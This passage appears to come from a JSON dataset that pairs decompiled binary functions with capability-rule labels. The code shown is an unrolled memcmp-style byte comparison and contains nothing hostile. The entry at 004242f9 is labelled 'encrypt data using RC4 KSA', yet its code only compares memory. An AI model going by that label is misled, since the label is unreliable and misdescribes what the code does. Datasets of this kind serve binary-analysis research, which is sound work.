uVar3 = *(arg_8h + (arg_10h - 10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar1 = *(arg_ch + (arg_10h - 9));\n            uVar3 = *(arg_8h + (arg_10h - 9));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar1 = *(arg_ch + (arg_10h - 8));\n            uVar3 = *(arg_8h + (arg_10h - 8));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 7)) - *(arg_ch + (arg_10h - 7));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423c4d:\n        uVar1 = *(arg_8h + (arg_10h - 6));\n        if (uVar1 == *(arg_ch + (arg_10h - 6))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 6));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 5));\n            uVar1 = *(arg_ch + (arg_10h - 5));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 4));\n            uVar1 = *(arg_ch + (arg_10h - 4));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 3)) - *(arg_ch + (arg_10h - 3));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423ce4:\n        if (*(arg_8h + (arg_10h - 2)) != *(arg_ch + (arg_10h - 2))) {\ncode_r0x0042413c:\n            uVar1 = *(arg_ch + (arg_10h - 2));\n            uVar3 = *(arg_8h + (arg_10h - 2));\n            if (uVar3 == uVar1) goto code_r0x0042389f;\n            iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1;\n            goto code_r0x00423897;\n        }\n        goto code_r0x00423483;\n    case 0x1f:\n        if (*(arg_8h + (arg_10h - 0x1f)) == *(arg_ch + (arg_10h - 0x1f))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 0x1f));\n            uVar3 = *(arg_8h + (arg_10h - 0x1f));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1e));\n            uVar1 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1d));\n            uVar1 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x1c)) - *(arg_ch + (arg_10h - 0x1c));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423d8f:\n        uVar1 = *(arg_8h + (arg_10h - 0x1b));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x1b))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x1a));\n            uVar1 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x19));\n            uVar1 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x18)) - *(arg_ch + (arg_10h - 0x18));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423e26:\n        uVar1 = *(arg_8h + (arg_10h - 0x17));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x17))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x16));\n            uVar1 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x15));\n            uVar1 = *(arg_ch + (arg_10h - 0x15));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x14)) - *(arg_ch + (arg_10h - 0x14));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423ebd:\n        uVar1 = *(arg_8h + (arg_10h - 0x13));\n        if (uVar1 == *(arg_ch + (arg_10h - 0x13))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0x13));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x12));\n            uVar1 = *(arg_ch + (arg_10h - 0x12));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0x11));\n            uVar1 = *(arg_ch + (arg_10h - 0x11));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0x10)) - *(arg_ch + (arg_10h - 0x10));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423f54:\n        if (*(arg_8h + (arg_10h - 0xf)) == *(arg_ch + (arg_10h - 0xf))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = *(arg_ch + (arg_10h - 0xf));\n            uVar3 = *(arg_8h + (arg_10h - 0xf));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xe));\n            uVar1 = *(arg_ch + (arg_10h - 0xe));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 0xd));\n            uVar1 = *(arg_ch + (arg_10h - 0xd));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 0xc)) - *(arg_ch + (arg_10h - 0xc));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00423fec:\n        uVar1 = *(arg_8h + (arg_10h - 0xb));\n        if (uVar1 == *(arg_ch + (arg_10h - 0xb))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 0xb));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 10));\n            uVar1 = *(arg_ch + (arg_10h - 10));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 9));\n            uVar1 = *(arg_ch + (arg_10h - 9));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 8)) - *(arg_ch + (arg_10h - 8));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x00424083:\n        uVar1 = *(arg_8h + (arg_10h - 7));\n        if (uVar1 == *(arg_ch + (arg_10h - 7))) {\n            iVar2 = 0;\n        }\n        else {\n            uVar1 = uVar1 & 0xff;\n            uVar3 = *(arg_ch + (arg_10h - 7));\n            if ((uVar1 != uVar3) && (iVar2 = (uVar1 != uVar3 && -1 < uVar1 - uVar3) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 6));\n            uVar1 = *(arg_ch + (arg_10h - 6));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            uVar3 = *(arg_8h + (arg_10h - 5));\n            uVar1 = *(arg_ch + (arg_10h - 5));\n            if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + (arg_10h - 4)) - *(arg_ch + (arg_10h - 4));\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\ncode_r0x0042411a:\n        uVar3 = *(arg_8h + (arg_10h - 3));\n        uVar1 = *(arg_ch + (arg_10h - 3));\n        if ((uVar3 != uVar1) && (iVar2 = (uVar3 != uVar1 && -1 < uVar3 - uVar1) * 2 + -1,  iVar2 != 0)) {\n            return iVar2;\n        }\n        goto code_r0x0042413c;\n    }\n}\n",
        "token_count": 16820
    },
    "004242f9": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004242f9(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar3 = 0;\n    if (0x1f < arg_10h) {\n        do {\n            if (*arg_8h == *arg_ch) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = *arg_8h & 0xff;\n                uVar2 = *arg_ch;\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 1);\n                uVar2 = *(arg_ch + 1);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 2);\n                uVar2 = *(arg_ch + 2);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 3) - *(arg_ch + 3);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[1] == arg_ch[1]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[1] & 0xff;\n                uVar2 = *(arg_ch + 1);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 5);\n                uVar2 = *(arg_ch + 5);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 6);\n                uVar2 = *(arg_ch + 6);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 7) - *(arg_ch + 7);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[2] == arg_ch[2]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[2] & 0xff;\n                uVar2 = *(arg_ch + 2);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 9);\n                uVar2 = *(arg_ch + 9);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 10);\n                uVar2 = *(arg_ch + 10);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[3] == arg_ch[3]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[3] & 0xff;\n                uVar2 = *(arg_ch + 3);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0xd);\n                uVar2 = *(arg_ch + 0xd);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0xe);\n                uVar2 = *(arg_ch + 0xe);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[4] == arg_ch[4]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[4] & 0xff;\n                uVar2 = *(arg_ch + 4);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x11);\n                uVar2 = *(arg_ch + 0x11);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x12);\n                uVar2 = *(arg_ch + 0x12);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[5] == arg_ch[5]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[5] & 0xff;\n                uVar2 = *(arg_ch + 5);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x15);\n                uVar2 = *(arg_ch + 0x15);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x16);\n                uVar2 = *(arg_ch + 0x16);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[6] == arg_ch[6]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[6] & 0xff;\n                uVar2 = *(arg_ch + 6);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x19);\n                uVar2 = *(arg_ch + 0x19);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x1a);\n                uVar2 = *(arg_ch + 0x1a);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[7] == arg_ch[7]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[7] & 0xff;\n                uVar2 = *(arg_ch + 7);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x1d);\n                uVar2 = *(arg_ch + 0x1d);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x1e);\n                uVar2 = *(arg_ch + 0x1e);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            arg_10h = arg_10h - 0x20;\n            arg_8h = arg_8h + 8;\n            arg_ch = arg_ch + 8;\n        } while (0x1f < arg_10h);\n    }\n    // switch table (32 cases) at 0x425a15\n    switch(arg_10h) {\n    case 1:\n        goto code_r0x004250af;\n    case 2:\n        goto code_r0x0042552a;\n    case 3:\n        goto code_r0x004259c6;\n    case 4:\n        goto code_r0x00424be8;\n    case 5:\n        goto code_r0x00425029;\n    case 6:\n        goto code_r0x0042548b;\n    case 7:\n        goto code_r0x00425937;\n    case 8:\n        goto code_r0x00424b49;\n    case 9:\n        goto code_r0x00424f8a;\n    case 10:\n        goto code_r0x004253ec;\n    case 0xb:\n        goto code_r0x00425898;\n    case 0xc:\n        goto code_r0x00424aaa;\n    case 0xd:\n        goto code_r0x00424eeb;\n    case 0xe:\n        goto code_r0x0042534d;\n    case 0xf:\n        goto code_r0x004257f9;\n    case 0x10:\n        goto code_r0x00424a0b;\n    case 0x11:\n        goto code_r0x00424e4c;\n    case 0x12:\n        goto code_r0x004252ae;\n    case 0x13:\n        goto code_r0x0042575a;\n    case 0x14:\n        goto code_r0x0042496c;\n    case 0x15:\n        goto code_r0x00424dad;\n    case 0x16:\n        goto code_r0x0042520f;\n    case 0x17:\n        goto code_r0x004256bb;\n    case 0x1c:\n        if (*(arg_8h + (arg_10h - 0x1c)) == *(arg_ch + (arg_10h - 0x1c))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x1c));\n            uVar4 = *(arg_8h + (arg_10h - 0x1c));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1b));\n            uVar2 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1a));\n            uVar2 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x19)) - *(arg_ch + (arg_10h - 0x19));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n    case 0x18:\n        uVar2 = *(arg_8h + (arg_10h - 0x18));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x18))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x17));\n            uVar2 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x16));\n            uVar2 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x15)) - *(arg_ch + (arg_10h - 0x15));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        goto code_r0x0042496c;\n    case 0x1d:\n        uVar2 = *(arg_8h + (arg_10h - 0x1d));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x1d))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1c));\n            uVar2 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1b));\n            uVar2 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x1a)) - *(arg_ch + (arg_10h - 0x1a));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n    case 0x19:\n        if (*(arg_8h + (arg_10h - 0x19)) == *(arg_ch + (arg_10h - 0x19))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x19));\n            uVar4 = *(arg_8h + (arg_10h - 0x19));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x18));\n            uVar2 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x17));\n            uVar2 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x16)) - *(arg_ch + (arg_10h - 0x16));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        goto code_r0x00424dad;\n    case 0x1e:\n        uVar2 = *(arg_8h + (arg_10h - 0x1e));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x1e))) {\n            iVar3 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1d));\n            uVar2 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1c));\n            uVar2 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            iVar3 = *(arg_8h + (arg_10h - 0x1b)) - *(arg_ch + (arg_10h - 0x1b));\n            if (iVar3 != 0) {\n                iVar3 = (0 < iVar3) * 2 + -1;\n            }\n        }\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    case 0x1a:\n        if (*(arg_8h + (arg_10h - 0x1a)) == *(arg_ch + (arg_10h - 0x1a))) {\n            iVar3 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x1a));\n            uVar4 = *(arg_8h + (arg_10h - 0x1a));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x19));\n            uVar2 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x18));\n            uVar2 = 